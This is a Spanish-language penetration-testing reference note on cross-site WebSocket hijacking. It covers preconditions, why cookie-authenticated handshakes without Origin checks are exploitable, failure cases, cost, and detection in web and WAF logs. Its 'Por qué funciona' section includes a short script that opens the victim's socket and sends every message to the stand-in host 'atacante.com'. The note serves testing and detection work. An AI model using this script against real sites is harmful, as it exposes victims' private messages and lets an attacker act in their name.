---
tipo: tradecraft
clase: "[[CWE-1385 - Missing Origin Validation in WebSockets]]"
eje: fase
implementacion: "Abrir un WebSocket contra el objetivo desde una página propia, con la sesión por cookie de la víctima, y leer y enviar mensajes"
opsec: ruidoso
telemetria: ["[[Log de acceso del servidor web]]", "[[Registro del WAF]]"]
requisitos: [handshake-sin-validación-de-origen, sesión-por-cookie]
coste: bajo
alternativas: ["[[WebSocket - confianza del canal]]", "[[CORS - reflejo del origen con credenciales]]"]
probado: nunca
contexto: [web-generica]
aliases:
  - WebSocket hijacking
  - secuestro de socket
tags:
  - dominio/web
---

# WebSocket - secuestro entre sitios

## Cuándo lo elijo

Cuando la aplicación usa WebSocket, la sesión viaja por cookie, y el handshake no valida el `Origin`. Se confirma abriendo el socket desde un origen distinto y viendo si el servidor lo acepta y manda mensajes. Es la prueba de apertura del dominio y la de mayor impacto.

La condición que hay que verificar antes de invertir es la misma que abre [[MOC - CSRF]] y [[MOC - CORS]]: la autenticación tiene que ser **por cookie**. Si el socket se autentica con un token que el script legítimo pasa en el primer mensaje, el del atacante no lo tiene y no hay secuestro por esta vía; ahí el dominio se vuelve el de [[WebSocket - confianza del canal]].

## Por qué funciona

El handshake es un `GET` con `Upgrade: websocket`, y como cualquier `GET` al dominio, el navegador le adjunta las cookies de la víctima. Si el servidor solo mira la cookie para autenticar el socket y no valida el `Origin`, una página del atacante abre el socket con la sesión de la víctima:

```html
<script>
  var ws = new WebSocket('wss://objetivo.com/chat');
  ws.onopen = () => ws.send('{"action":"getHistory"}');
  ws.onmessage = e => fetch('https://atacante.com/x?d=' + encodeURIComponent(e.data));
</script>
```

La víctima solo tiene que abrir esa página estando autenticada. A diferencia del CSRF clásico, el atacante **lee las respuestas** —`ws.onmessage` las recibe en su propio origen—, así que consigue un canal bidireccional autenticado: leer el historial, los mensajes privados, las notificaciones, y enviar acciones en nombre de la víctima.

Las defensas del CSRF clásico no lo detienen, y esa es la razón de que la clase sea propia:

- `SameSite` trata el handshake distinto de un formulario y durante años lo dejó pasar.
- No suele haber token anti-CSRF en el handshake.
- El control previo de CORS no aplica al handshake como aplica a `fetch`.

La única defensa específica es validar el `Origin`, y por eso la prueba es mandar un `Origin` inventado y ver si el socket abre igual. Las variantes de bypass —cuando hay validación pero es laxa— reusan el catálogo de [[CORS bypass de origen - matriz de referencia]], porque el problema de comparar un origen es el mismo.

## Cómo falla

Falla contra validación de `Origin` del handshake con lista blanca exacta. Es la mitigación específica y la que cierra la rama.

Falla cuando el socket no se autentica por cookie sino por un token que el script legítimo conoce —pasado en el handshake o en el primer mensaje—: el atacante puede abrir el socket pero no autenticarlo. Ahí queda [[WebSocket - confianza del canal]] si el token se puede robar o adivinar.

Y falla, como toda la familia de CSRF, si la acción sensible pide reautenticación por mensaje.

## Coste

Bajo. Confirmar la ausencia de validación de `Origin` es un handshake con `Origin` inventado. La prueba de concepto son las cuatro líneas de arriba, alojadas en una página. No hace falta calcular nada al byte ni construir payloads.

El único costo real es que necesita **una víctima autenticada que abra la página**, igual que todos los ataques del lado del cliente — un techo de severidad que hay que reflejar en el informe, y que se demuestra con dos sesiones.

## Huella esperada

Firma clara y escribible, aunque casi nunca vigilada:

- El handshake del ataque lleva un **`Origin` que no corresponde al dominio** sobre una petición `Upgrade: websocket`. Un WebSocket abierto desde un origen externo no ocurre en tráfico legítimo, así que es una firma de alta fidelidad — análoga a la del `Origin` reflejado de [[CORS - reflejo del origen con credenciales]], y por la misma razón. Vive en [[Log de acceso del servidor web]] si registra el handshake con su `Origin`, o en [[Registro del WAF]].
- A diferencia de casi todos los huecos recientes, la cabecera `Origin` del handshake **se registra más seguido** que los cuerpos, porque el handshake es una petición HTTP normal. Es un candidato de detección escribible: alertar handshakes de WebSocket con `Origin` fuera de la lista blanca.

Una vez abierto el socket, los mensajes van por el canal WebSocket, que la mayoría de las fuentes **no inspecciona** —el WAF ve el handshake y después es ciego—. Eso es lo que hace a [[WebSocket - confianza del canal]] silencioso, pero el secuestro en sí se delata en el handshake. Anotado en [[MOC - WebSocket]].
